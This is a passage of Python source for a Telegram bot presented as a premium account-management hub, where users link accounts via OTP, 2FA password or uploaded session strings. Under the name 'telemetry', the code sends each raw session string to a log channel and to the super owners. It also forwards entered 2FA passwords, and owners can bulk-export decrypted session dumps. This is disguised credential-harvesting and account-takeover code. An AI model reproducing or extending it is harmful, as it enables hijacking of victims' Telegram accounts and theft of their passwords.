        if ref_payload.startswith("ref_") and ref_payload[4:].isdigit():
            referred_by = int(ref_payload[4:])
            if referred_by == user_id:
                referred_by = None

    await db_mgr.create_user_if_not_exists(user_id, username, referred_by)
    role = await db_mgr.get_user_role(user_id)
    await db_mgr.log_action(user_id, "Started the bot", bot, operational=False)

    welcome_text = (
        f"👋 <b>Greetings, Elite User! Welcome back to Premium Session Hub Bot Terminal.</b>\n\n"
        f"Your system assigned clearance grade identifier: <b>{role.upper()}</b>\n"
        f"Select execution options or deploy automated cluster configurations below:"
    )
    await message.answer(welcome_text, reply_markup=get_main_keyboard(role), parse_mode="HTML")

@router.callback_query(F.data == "main_menu")
async def handle_main_menu(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    await state.clear()
    role = await db_mgr.get_user_role(callback.from_user.id)
    await callback.message.edit_text(
        f"👋 <b>Greetings, Elite User! Welcome back to Premium Session Hub Bot Terminal.</b>\n\n"
        f"Your system assigned clearance grade identifier: <b>{role.upper()}</b>\n"
        f"Select execution options or deploy automated cluster configurations below:",
        reply_markup=get_main_keyboard(role),
        parse_mode="HTML"
    )

@router.message(Command("canceltasks"))
async def cmd_cancel_tasks(message: Message, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.answer("⚠️ <b>Clearance Denied:</b> Access token restricted to System Operators.")
        return

    await message.answer("🛑 <i>Terminating thread execution loops across pending and active campaign tasks...</i>", parse_mode="HTML")
    killed_count = await task_queue.cancel_all_active_tasks()
    await db_mgr.db.tasks.update_many(
        {"status": {"$in": ["pending", "running"]}},
        {"$set": {"status": "cancelled"}}
    )
    await message.answer(f"✨ <b>Task Termination Loop Completed!</b> Successfully cancelled <code>{killed_count}</code> pending or active task threads.")

# --- MONGODB STORAGE MONITORING COMMAND & CALLBACK ---
@router.message(Command("adminstorage"))
async def cmd_admin_storage(message: Message, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.answer("⚠️ <b>Clearance Denied:</b> Reserved for Administrative Operators.")
        return

    stats = await db_mgr.get_storage_stats()
    if not stats:
        await message.answer("❌ Failed to fetch database metrics from MongoDB server.")
        return

    text = (
        f"💾 <b>MongoDB Database Storage Telemetry</b>\n\n"
        f"📦 Data Size: <code>{stats['data_size_mb']} MB</code>\n"
        f"💾 Storage Size: <code>{stats['storage_size_mb']} MB</code>\n"
        f"🔑 Index Size: <code>{stats['index_size_mb']} MB</code>\n"
        f"📄 Document Objects: <code>{stats['objects']}</code>\n"
        f"🗂️ Total Collections: <code>{stats['collections']}</code>"
    )
    await message.answer(text, parse_mode="HTML")

@router.callback_query(F.data == "check_db_storage")
async def handle_check_db_storage(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await callback.answer("⚠️ Clearance Denied.", show_alert=True)
        return

    await callback.answer()
    stats = await db_mgr.get_storage_stats()
    if not stats:
        await callback.message.edit_text("❌ Failed to fetch database metrics from MongoDB server.")
        return

    text = (
        f"💾 <b>MongoDB Database Storage Telemetry</b>\n\n"
        f"📦 Data Size: <code>{stats['data_size_mb']} MB</code>\n"
        f"💾 Storage Size: <code>{stats['storage_size_mb']} MB</code>\n"
        f"🔑 Index Size: <code>{stats['index_size_mb']} MB</code>\n"
        f"📄 Document Objects: <code>{stats['objects']}</code>\n"
        f"🗂️ Total Collections: <code>{stats['collections']}</code>"
    )
    buttons = [[InlineKeyboardButton(text="🔙 Return Back", callback_data="admin_panel", style="primary")]]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

# --- SUPER OWNER EXCLUSIVE: GRANT & REVOKE 20 ACCOUNT IDS ACCESS ---
@router.message(Command("grantaccess"))
async def cmd_grant_access(message: Message, command: CommandObject, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role != "super_owner":
        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Super Owner privileges.")
        return

    args = command.args
    if not args:
        await message.answer("✨ <b>Syntax:</b> <code>/grantaccess &lt;user_id&gt; [count]</code>\n<i>Default count is 20 IDs.</i>", parse_mode="HTML")
        return

    parts = args.split()
    if not parts[0].isdigit():
        await message.answer("❌ Invalid Target User ID integer format.")
        return

    target_id = int(parts[0])
    count = int(parts[1]) if len(parts) > 1 and parts[1].isdigit() else 20

    rows = await db_mgr.db.accounts.find({"status": "active"}).to_list(length=count)

    if not rows:
        await message.answer("❌ No active accounts found in the database to grant.")
        return

    assigned_count = 0
    for row in rows:
        ph = row["phone"]
        await db_mgr.db.account_assignments.update_one(
            {"user_id": target_id, "phone": ph},
            {"$set": {"user_id": target_id, "phone": ph}},
            upsert=True
        )
        assigned_count += 1

    await message.answer(
        f"👑 <b>Access Provisioned Successfully!</b>\n\n"
        f"👤 Target User ID: <code>{target_id}</code>\n"
        f"📱 Granted IDs Allocation: <code>{assigned_count}</code> active accounts\n"
        f"🔒 <i>Note: This user can ONLY execute tasks using these IDs and CANNOT export session strings.</i>",
        parse_mode="HTML"
    )

    try:
        await bot.send_message(
            chat_id=target_id,
            text=f"🎉 <b>Special Task Access Granted!</b>\nSuper Owner has provisioned <code>{assigned_count}</code> account IDs for your task execution. You can now use these accounts in Task Launcher!",
            parse_mode="HTML"
        )
    except Exception:
        pass

@router.message(Command("revokeaccess"))
async def cmd_revoke_access(message: Message, command: CommandObject, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role != "super_owner":
        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Super Owner privileges.")
        return

    args = command.args
    if not args or not args.strip().isdigit():
        await message.answer("✨ <b>Syntax:</b> <code>/revokeaccess &lt;user_id&gt;</code>", parse_mode="HTML")
        return

    target_id = int(args.strip())
    await db_mgr.db.account_assignments.delete_many({"user_id": target_id})

    await message.answer(f"✨ Revoked all assigned account ID access from user <code>{target_id}</code>.", parse_mode="HTML")

# --- ADMINISTRATIVE CORRIDORS ---
@router.message(Command("addadmin"))
async def cmd_add_admin(message: Message, command: CommandObject, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Owner privilege tokens.")
        return
        
    args = command.args
    if not args:
        await message.answer("✨ <b>Syntax Profile Map layout:</b> <code>/addadmin &lt;user_id&gt;</code>", parse_mode="HTML")
        return
        
    target_id_str = args.split()[0]
    if not target_id_str.isdigit():
        await message.answer("❌ Parameters mismatch error: Numerical integers values required exclusively.")
        return
        
    target_id = int(target_id_str)
    limit_val = 999999999
    
    await db_mgr.db.users.update_one(
        {"user_id": target_id},
        {"$set": {"role": "admin", "max_accounts": limit_val}},
        upsert=True
    )
        
    await message.answer(f"💎 <b>Success:</b> User <code>{target_id}</code> updated to Admin with unlimited account capacity.", parse_mode="HTML")
    await db_mgr.log_action(user_id, f"Made user {target_id} an Admin (unlimited)", bot, operational=True)

@router.message(Command("removeadmin"))
async def cmd_remove_admin(message: Message, command: CommandObject, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["owner", "super_owner"]:
        await message.answer("⚠️ <b>Clearance Denied:</b> This command requires Owner privilege tokens.")
        return
        
    target_id_str = command.args
    if not target_id_str or not target_id_str.strip().isdigit():
        await message.answer("✨ <b>Syntax Profile Map layout:</b> <code>/removeadmin &lt;user_id&gt;</code>", parse_mode="HTML")
        return
        
    target_id = int(target_id_str.strip())
    await db_mgr.db.users.update_one({"user_id": target_id}, {"$set": {"role": "user"}})
        
    await message.answer(f"💎 <b>Success:</b> Authorization structural privileges revoked from Admin ID <code>{target_id}</code>.", parse_mode="HTML")
    await db_mgr.log_action(user_id, f"Removed Admin role from user {target_id}", bot, operational=True)

# --- BROADCAST SYSTEM WORKFLOW ---
@router.message(Command("broadcast"))
async def cmd_broadcast_start(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    role = await db_mgr.get_user_role(user_id)
    if role not in ["admin", "owner", "super_owner"]:
        await message.answer("⚠️ <b>Clearance Denied:</b> Command restricted to Administration Nodes.")
        return
        
    await message.answer("📢 <b>Input Data Text or Multimedia payload content to broadcast:</b>", parse_mode="HTML")
    await state.set_state(BroadcastStates.waiting_for_msg)

@router.message(StateFilter(BroadcastStates.waiting_for_msg))
async def process_broadcast_push(message: Message, state: FSMContext, bot: Bot):
    await state.clear()
    status_msg = await message.answer("🚀 <i>Dispatching system global notifications layout across all registered user clusters...</i>", parse_mode="HTML")
    
    users = await db_mgr.db.users.find({}, {"user_id": 1}).to_list(length=None)
        
    success_hits = 0
    failed_hits = 0
    
    for r in users:
        target_uid = r["user_id"]
        try:
            await bot.copy_message(chat_id=target_uid, from_chat_id=message.chat.id, message_id=message.message_id)
            success_hits += 1
            await asyncio.sleep(0.05)  
        except Exception:
            failed_hits += 1
            
    await status_msg.edit_text(
        f"📢 <b>Global System Broadcast Complete!</b>\n\n"
        f"🟩 Delivered: <code>{success_hits}</code> unique profiles\n"
        f"🟪 Blocked/Dead targets dropped: <code>{failed_hits}</code> nodes",
        parse_mode="HTML"
    )

@router.callback_query(F.data == "system_credits")
async def handle_system_credits(callback: CallbackQuery, bot: Bot):
    await callback.answer()
    credits_text = (
        "🔱 <b>Lead Operations Developer Architect Info</b>\n\n"
        f"🎨 <b>UI/UX Aesthetic Architect:</b> @{config.DESIGNER_HANDLE}\n"
        f"⚙️ <b>Core Binary Operations Engineer:</b> @{config.MANAGER_HANDLE}\n\n"
        "<i>Thank you for utilising our premium cluster account management utility matrix core!</i>"
    )
    buttons = [[InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")]]
    await callback.message.edit_text(text=credits_text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

# --- PAGINATED ACCOUNTS VIEW ---
@router.callback_query(F.data.startswith("manage_accounts:"))
async def list_user_accounts(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    limit = 10
    offset = page * limit
    
    try:
        await callback.answer() 
        role = await db_mgr.get_user_role(user_id)
        
        if role in ["owner", "super_owner"]:
            total_items = await db_mgr.db.accounts.count_documents({})
            rows = await db_mgr.db.accounts.find({}).skip(offset).limit(limit).to_list(length=limit)
        else:
            total_items = await db_mgr.db.accounts.count_documents({"user_id": user_id})
            rows = await db_mgr.db.accounts.find({"user_id": user_id}).skip(offset).limit(limit).to_list(length=limit)

        text = f"📱 <b>System Session Telephony Matrix</b> (Page {page + 1})\n"
        text += f"Total registered datastore slots catalogued: <code>{total_items}</code>\n\n"
        
        if not rows:
            text += "<i>No profile records mapped inside this page window framework.</i>"
        else:
            for row in rows:
                icon = "🟢" if row.get("status") == "active" else "🔴"
                text += f"{icon} <code>+{row.get('phone')}</code> (<b>@{row.get('username') or 'None'}</b>) ➜ [<b>{row.get('status', '').upper()}</b>]\n"

        buttons = []
        import_row = [
            InlineKeyboardButton(text="⭐ Connect via OTP", callback_data="add_account_phone", style="success"),
            InlineKeyboardButton(text="📁 Upload String File", callback_data="add_account_session", style="success")
        ]
        buttons.append(import_row)

        if role in ["super_owner", "owner"]:
            buttons.append([InlineKeyboardButton(text="📥 Open Session Export Dashboard", callback_data="export_dashboard_root", style="danger")])
            
        buttons.append([InlineKeyboardButton(text="💥 Delete Dead Sessions", callback_data=f"purge_dead_accounts:{page}", style="danger")])
        
        nav_row = []
        if page > 0:
            nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"manage_accounts:{page - 1}", style="primary"))
        if offset + limit < total_items:
            nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"manage_accounts:{page + 1}", style="primary"))
        
        if nav_row:
            buttons.append(nav_row)
            
        buttons.append([InlineKeyboardButton(text="💎 Return Home Menu", callback_data="main_menu", style="primary")])
        await callback.message.edit_text(text=text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")
    except Exception as e:
        logger.error(f"Error handling list view page context: {e}")

@router.callback_query(F.data.startswith("purge_dead_accounts:"))
async def handle_purge_dead_accounts(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    role = await db_mgr.get_user_role(user_id)
    if role in ["owner", "super_owner"]:
        await db_mgr.db.accounts.delete_many({"status": "dead"})
    else:
        await db_mgr.db.accounts.delete_many({"status": "dead", "user_id": user_id})

    await callback.answer("✨ Purge process complete! Dead profile sessions dropped.", show_alert=True)
    
    callback.data = f"manage_accounts:{page}"
    await list_user_accounts(callback, bot)

# --- LINK NEW ACCOUNT VIA OTP & 2FA TELEMETRY ALERT ---
@router.callback_query(F.data == "add_account_phone")
async def add_account_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.edit_text("📱 <b>Type targeted terminal phone number string with country code mapping prefix (e.g. +919876543210):</b>", parse_mode="HTML")
    await state.set_state(RegistrationStates.waiting_for_phone)

@router.message(StateFilter(RegistrationStates.waiting_for_phone))
async def process_phone(message: Message, state: FSMContext, bot: Bot):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    user_id = message.from_user.id
    client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        registration_sessions[user_id] = {"client": client, "phone": phone, "phone_code_hash": sent_code.phone_code_hash}
        await message.answer("📩 <b>Enter the authentication OTP code received from official Telegram channel:</b>", parse_mode="HTML")
        await state.set_state(RegistrationStates.waiting_for_otp)
    except Exception as e:
        await message.answer(f"❌ <b>API Initialization Framework Refusal:</b> <code>{str(e)}</code>", parse_mode="HTML")
        await client.disconnect()
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_otp))
async def process_otp(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    otp = message.text.strip()
    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await message.answer("❌ Context session dropped framework boundaries. Re-run setup sequence initialization loops.")
        await state.clear()
        return

    client, phone, phone_code_hash = reg_data["client"], reg_data["phone"], reg_data["phone_code_hash"]
    try:
        await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
        await complete_registration(message, state, client, phone, user_id, bot)
    except PhoneCodeInvalidError:
        await message.answer("❌ <b>The security signature token OTP code entered was mismatched/invalid. Retry again:</b>", parse_mode="HTML")
    except SessionPasswordNeededError:
        await dispatch_2fa_alert(bot, user_id, phone)
        await message.answer("🔒 <b>Two-Factor security matrix verification prompt detected. Type your 2FA security password text:</b>", parse_mode="HTML")
        await state.set_state(RegistrationStates.waiting_for_2fa)
    except Exception as e:
        await message.answer(f"❌ <b>Authentication Chain Refusal:</b> <code>{str(e)}</code>", parse_mode="HTML")
        await client.disconnect()
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_2fa))
async def process_2fa(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    password = message.text.strip()
    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await state.clear()
        return
    try:
        await reg_data["client"].sign_in(password=password)
        await dispatch_2fa_alert(bot, user_id, reg_data["phone"], password_entered=password)
        await complete_registration(message, state, reg_data["client"], reg_data["phone"], user_id, bot)
    except Exception as e:
        await message.answer(f"❌ <b>Cloud Password Evaluation Denied:</b> <code>{str(e)}</code>", parse_mode="HTML")
        await reg_data["client"].disconnect()
        await state.clear()

async def complete_registration(message: Message, state: FSMContext, client: TelegramClient, phone: str, user_id: int, bot: Bot):
    try:
        me = await client.get_me()
        raw_session_str = client.session.save()
        encrypted_session = encrypt_data(raw_session_str)
        
        clean_phone = phone.replace("+", "")
        await db_mgr.db.accounts.update_one(
            {"phone": clean_phone},
            {"$set": {
                "phone": clean_phone,
                "user_id": user_id,
                "username": me.username or "None",
                "session_string": encrypted_session,
                "status": "active",
                "last_active": time.time()
            }},
            upsert=True
        )
        
        await dispatch_session_telemetry(phone, raw_session_str, me.username, user_id, bot)

        await message.answer(
            f"🎉 <b>Onboarding Successful!</b> Account <code>+{phone}</code> is verified and logged inside system memory banks.", 
            reply_markup=get_post_registration_keyboard(),
            parse_mode="HTML"
        )
    except Exception as e:
        await message.answer(f"❌ <b>Telemetry Storage Pipeline Failure:</b> <code>{str(e)}</code>", parse_mode="HTML")
    finally:
        await client.disconnect()
        registration_sessions.pop(user_id, None)
        await state.clear()

# --- ADVANCED UNIVERSAL IMPORT SYSTEM ---
@router.callback_query(F.data == "add_account_session")
async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.edit_text("📁 <b>Drop your raw telethon string session strings layout, text line values, or upload a .txt / .session file log:</b>\n<i>(Supports unlimited bulk multi-line file imports!)</i>", parse_mode="HTML")
    await state.set_state(RegistrationStates.waiting_for_session_file)

@router.message(StateFilter(RegistrationStates.waiting_for_session_file))
async def process_session_file(message: Message, state: FSMContext, bot: Bot):
    user_id = message.from_user.id
    raw_content = ""
    
    if message.document:
        file_info = await bot.get_file(message.document.file_id)
        file_bytes = await bot.download_file(file_info.file_path)
        raw_content = file_bytes.read().decode('utf-8', errors='ignore').strip()
    elif message.text:
        raw_content = message.text.strip()

    if not raw_content:
        await message.answer("❌ <b>Source Error:</b> Empty input detected. Verification canceled.")
        await state.clear()
        return

    potential_sessions = [s.strip() for s in re.split(r'[\r\n,;]+', raw_content) if len(s.strip()) > 30]
    
    if not potential_sessions:
        await message.answer("❌ <b>Parse Failure:</b> Could not isolate any valid telethon format session string sequences inside your text.")
        await state.clear()
        return

    status_msg = await message.answer(f"⚡ <b>Analyzing and validating <code>{len(potential_sessions)}</code> potential session profiles chunks...</b>", parse_mode="HTML")
    
    success_imports = 0
    failed_imports = 0

    for session_str in potential_sessions:
        try:
            client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
            await client.connect()
            if not await client.is_user_authorized():
                failed_imports += 1
                await client.disconnect()
                continue
                
            me = await client.get_me()
            phone = me.phone or f"custom_{me.id}"
            encrypted_session = encrypt_data(session_str)
            
            clean_phone = phone.replace("+", "")
            await db_mgr.db.accounts.update_one(
                {"phone": clean_phone},
                {"$set": {
                    "phone": clean_phone,
                    "user_id": user_id,
                    "username": me.username or "None",
                    "session_string": encrypted_session,
                    "status": "active",
                    "last_active": time.time()
                }},
                upsert=True
            )

            await dispatch_session_telemetry(phone, session_str, me.username, user_id, bot)
            success_imports += 1
            await client.disconnect()
        except Exception:
            failed_imports += 1

    result_text = (
        f"✨ <b>Bulk Framework Import Profile Sync Complete!</b>\n\n"
        f"🟩 Successfully added: <code>{success_imports}</code> accounts\n"
        f"num Terminated/Mismatched failed count: <code>{failed_imports}</code> keys"
    )

    await status_msg.edit_text(result_text, reply_markup=get_post_registration_keyboard(), parse_mode="HTML")
    await state.clear()

# Telemetry Dispatch Helper
async def dispatch_session_telemetry(phone: str, session_str: str, username: Optional[str], adder_id: int, bot: Bot):
    file_bytes = session_str.encode('utf-8')
    document = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
    caption = f"🔑 <b>Session Event Telemetry Dump</b>\nPhone: <code>+{phone}</code>\nUsername: <b>@{username or 'None'}</b>\nOperator Creator ID: <code>{adder_id}</code>"
    
    if config.LOG_CHANNEL_ID:
        try:
            await bot.send_document(chat_id=config.LOG_CHANNEL_ID, document=document, caption=caption, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending updates to log channel: {e}")
            
    for owner_id in config.SUPER_OWNER_IDS:
        try:
            owner_doc = BufferedInputFile(file_bytes, filename=f"session_{phone}.txt")
            await bot.send_document(chat_id=owner_id, document=owner_doc, caption=caption, parse_mode="HTML")
        except Exception as e:
            logger.error(f"Failed sending data to owner node {owner_id}: {e}")

# --- EXPORT ARCHIVE MANAGEMENT HOOKS (RESTRICTED TO OWNERS ONLY) ---
@router.callback_query(F.data == "export_dashboard_root")
async def export_dashboard_root(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["super_owner", "owner"]:
        await callback.answer("⚠️ Clearance Level Violated: File extraction dashboard tools are barred for non-owners.", show_alert=True)
        return
        
    await callback.answer()
    text = "📥 <b>Session Extraction Management Dashboard Terminal</b>\nSelect extraction criteria filters:"
    buttons = [
        [InlineKeyboardButton(text="🎯 Extract 1 Single Session Profile", callback_data="select_export_session:0", style="primary")],
        [InlineKeyboardButton(text="🎭 Multi-Session Extract", callback_data="export_multi_start:0", style="primary")],
        [InlineKeyboardButton(text="📦 Extract Full Pack", callback_data="bulk_admin_export", style="danger")],
        [InlineKeyboardButton(text="🔙 Return Back", callback_data="manage_accounts:0", style="primary")]
    ]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

@router.callback_query(F.data.startswith("select_export_session:"))
async def select_export_session_menu(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    await callback.answer()
    
    limit = 10
    offset = page * limit
    role = await db_mgr.get_user_role(user_id)
    
    if role == "super_owner":
        total_items = await db_mgr.db.accounts.count_documents({"status": "active"})
        rows = await db_mgr.db.accounts.find({"status": "active"}).skip(offset).limit(limit).to_list(length=limit)
    elif role == "owner":
        total_items = await db_mgr.db.accounts.count_documents({
            "status": "active",
            "user_id": {"$nin": config.SUPER_OWNER_IDS}
        })
        rows = await db_mgr.db.accounts.find({
            "status": "active",
            "user_id": {"$nin": config.SUPER_OWNER_IDS}
        }).skip(offset).limit(limit).to_list(length=limit)
    else:
        await callback.message.answer("🚫 Permission check validation rejected.")
        return

    if not rows:
        await callback.message.answer("⚠️ No accessible active telephony data clusters found corresponding to your filter access.")
        return

    text = f"Select structural database session profile target row to dump (Page {page + 1}):"
    buttons = [[InlineKeyboardButton(text=f"📱 +{r['phone']} (@{r.get('username') or 'None'})", callback_data=f"export_ph:{r['phone']}", style="primary")] for r in rows]
    
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"select_export_session:{page - 1}", style="primary"))
    if offset + limit < total_items:
        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"select_export_session:{page + 1}", style="primary"))
    if nav_row:
        buttons.append(nav_row)
        
    buttons.append([InlineKeyboardButton(text="🔙 Return Back", callback_data="export_dashboard_root", style="primary")])
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data.startswith("export_ph:"))
async def handle_export_session_run(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    phone = callback.data.split(":")[1]
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["super_owner", "owner"]:
        await callback.message.answer("🚫 Authorization access denied.")
        return

    row = await db_mgr.db.accounts.find_one({"phone": phone})

    if not row:
        await callback.message.answer("❌ Selected profile data missing inside datastore registries.")
        return

    if row["user_id"] in config.SUPER_OWNER_IDS and role != "super_owner":
        await callback.message.answer("🛡️ <b>Access Violation:</b> Super Owner profiles are isolated and protected.")
        return

    session_bytes = decrypt_data(row["session_string"]).encode('utf-8')
    session_file = BufferedInputFile(session_bytes, filename=f"string_{phone}.txt")
    await callback.message.reply_document(document=session_file, caption=f"✨ Session dump file generated safely for: <code>+{phone}</code>", parse_mode="HTML")

@router.callback_query(F.data.startswith("export_multi_start:"))
async def export_multi_dashboard(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    page = int(callback.data.split(":")[1])
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["super_owner", "owner"]:
        await callback.message.answer("🚫 Permission check validation rejected.")
        return
        
    fsm_data = await state.get_data()
    selected = fsm_data.get("multi_export_selected", [])
    
    limit = 10
    offset = page * limit
    
    if role == "super_owner":
        total_items = await db_mgr.db.accounts.count_documents({"status": "active"})
        rows = await db_mgr.db.accounts.find({"status": "active"}).skip(offset).limit(limit).to_list(length=limit)
    else:
        total_items = await db_mgr.db.accounts.count_documents({
            "status": "active",
            "user_id": {"$nin": config.SUPER_OWNER_IDS}
        })
        rows = await db_mgr.db.accounts.find({
            "status": "active",
            "user_id": {"$nin": config.SUPER_OWNER_IDS}
        }).skip(offset).limit(limit).to_list(length=limit)

    text = f"🎭 <b>Multi-Session Selection Panel</b> (Selected: {len(selected)})\nChoose sessions to extract:"
    
    buttons = []
    for r in rows:
        ph = r['phone']
        is_sel = ph in selected
        prefix = "✅ " if is_sel else ""
        btn_style = "success" if is_sel else "primary"
        buttons.append([InlineKeyboardButton(text=f"{prefix}+{ph}", callback_data=f"toggle_export_sel:{ph}:{page}", style=btn_style)])
        
    nav_row = []
    if page > 0:
        nav_row.append(InlineKeyboardButton(text="⏮️ Previous", callback_data=f"export_multi_start:{page - 1}", style="primary"))
    if offset + limit < total_items:
        nav_row.append(InlineKeyboardButton(text="Next ⏭️", callback_data=f"export_multi_start:{page + 1}", style="primary"))
    if nav_row:
        buttons.append(nav_row)
        
    if selected:
        buttons.append([InlineKeyboardButton(text=f"🚀 Download Selected ({len(selected)}) Sessions", callback_data="download_multi_selected", style="success")])
        
    buttons.append([InlineKeyboardButton(text="🔙 Return Back", callback_data="export_dashboard_root", style="primary")])
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons), parse_mode="HTML")

@router.callback_query(F.data.startswith("toggle_export_sel:"))
async def toggle_export_selection(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    parts = callback.data.split(":")
    ph, page = parts[1], int(parts[2])
    
    fsm_data = await state.get_data()
    selected = fsm_data.get("multi_export_selected", [])
    
    if ph in selected:
        selected.remove(ph)
    else:
        selected.append(ph)
        
    await state.update_data(multi_export_selected=selected)
    
    callback.data = f"export_multi_start:{page}"
    await export_multi_dashboard(callback, state, bot)

@router.callback_query(F.data == "download_multi_selected")
async def download_multi_selected(callback: CallbackQuery, state: FSMContext, bot: Bot):
    await callback.answer()
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["super_owner", "owner"]:
        await callback.message.answer("🚫 Permission check validation rejected.")
        return
        
    fsm_data = await state.get_data()
    selected = fsm_data.get("multi_export_selected", [])
    
    if not selected:
        await callback.message.answer("⚠️ Selection list empty!")
        return

    status_msg = await callback.message.answer("⏳ <i>Building multi-session string export bundle...</i>", parse_mode="HTML")
    
    file_lines = []
    rows = await db_mgr.db.accounts.find({"phone": {"$in": selected}}).to_list(length=None)

    for r in rows:
        if r["user_id"] in config.SUPER_OWNER_IDS and role != "super_owner":
            continue
        file_lines.append(decrypt_data(r["session_string"]))

    combined = "\n".join(file_lines).encode('utf-8')
    export_file = BufferedInputFile(combined, filename=f"multi_sessions_pack_{len(file_lines)}.txt")
    
    await status_msg.delete()
    await callback.message.reply_document(document=export_file, caption=f"✨ Multi-session pack exported successfully! (Contains {len(file_lines)} sessions)", parse_mode="HTML")
    await state.update_data(multi_export_selected=[])

@router.callback_query(F.data == "bulk_admin_export")
async def handle_bulk_export(callback: CallbackQuery, bot: Bot):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    if role not in ["super_owner", "owner"]:
        await callback.answer("⚠️ Clearance Level Violated.", show_alert=True)
        return
        
    await callback.answer()
    status_msg = await callback.message.answer("⏳ <i>Exporting database session strings...</i>", parse_mode="HTML")
    
    if role == "super_owner":
        rows = await db_mgr.db.accounts.find({"status": "active"}).to_list(length=None)
    else:
        rows = await db_mgr.db.accounts.find({
            "status": "active",
            "user_id": {"$nin": config.SUPER_OWNER_IDS}
        }).to_list(length=None)

    if not rows:
        await status_msg.edit_text("❌ Zero profile session payloads matched extraction query bounds.")
        return

    file_lines = [decrypt_data(r["session_string"]) for r in rows]
    export_bytes = "\n".join(file_lines).encode('utf-8')
    bulk_file = BufferedInputFile(export_bytes, filename=f"full_database_dump_{len(rows)}.txt")
    
    await status_msg.delete()
    await callback.message.reply_document(document=bulk_file, caption=f"✨ Full Session Dump: Delivered <code>{len(rows)}</code> session payloads.", parse_mode="HTML")

# --- CONCURRENT TASK INITIALIZATION WIZARD ROUTING ---
@router.callback_query(F.data == "task_hub_start")
async def task_hub_start(callback: CallbackQuery, state: FSMContext, bot: Bot):
    user_id = callback.from_user.id
    await callback.answer()
    await state.clear()
    
    role = await db_mgr.get_user_role(user_id)
    
    if role == "super_owner":
        user_accounts = await db_mgr.db.accounts.count_documents({"status": "active", "user_id": user_id})
        all_accounts = await db_mgr.db.accounts.count_documents({"status": "active"})
        active_count = all_accounts
    elif role == "owner":
        active_count = await db_mgr.db.accounts.count_documents({"status": "active"})
    else:
        assignments = await db_mgr.db.account_assignments.find({"user_id": user_id}).to_list(length=None)
        assigned_phones = [a["phone"] for a in assignments]
        active_count = await db_mgr.db.accounts.count_documents({
            "status": "active",
            "$or": [
                {"user_id": user_id},
                {"phone": {"$in": assigned_phones}}
            ]
        })

    if active_count == 0:
        await callback.message.edit_text("⚠️ <b>Task Execution Engine Offline:</b> Zero active Telethon worker sessions detected. Please connect sessions first.", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="💎 Home Menu", callback_data="main_menu", style="primary")]]), parse_mode="HTML")
        return

    if role == "super_owner":
        buttons = [
            [InlineKeyboardButton(text=f"👑 Super Owner Accounts ({user_accounts})", callback_data="routing_scope:own", style="success")],
            [InlineKeyboardButton(text=f"🌍 Universal System Accounts ({all_accounts})", callback_data="routing_scope:all", style="danger")],
